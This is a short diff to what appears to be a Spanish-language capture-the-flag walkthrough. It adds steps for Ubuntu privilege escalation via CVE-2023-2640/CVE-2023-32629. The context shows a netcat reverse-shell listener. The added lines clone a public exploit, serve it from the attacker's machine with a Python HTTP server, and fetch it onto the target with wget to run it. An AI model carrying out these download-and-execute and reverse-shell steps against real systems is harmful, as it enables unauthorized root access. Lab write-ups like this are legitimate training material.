@@ -253,4 +253,26 @@ a nuestro equipo de la siguiente forma:
 y nos ponemos en escucha:
 nc -lnvp <nuestro_puerto>
 
+copiamos en la carpeta exploit la siguiente vulneravilidad
 
+❯ git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
+
+ingresamos a la carpeta 
+
+❯ cd CVE-2023-2640-CVE-2023-32629
+
+creamos un servidor de python
+
+python3 -m http.server
+
+en la maquina en la carpeta de tmp nos desacrgamos el exploit con wget 
+
+wget 10.10.14.110:8000/exploit.sh
+
+le damos permisoa de ejecucion con 
+
+chmod +x <exploit.sh>
+
+y lo ejecutamos 
+
+./exploit.sh
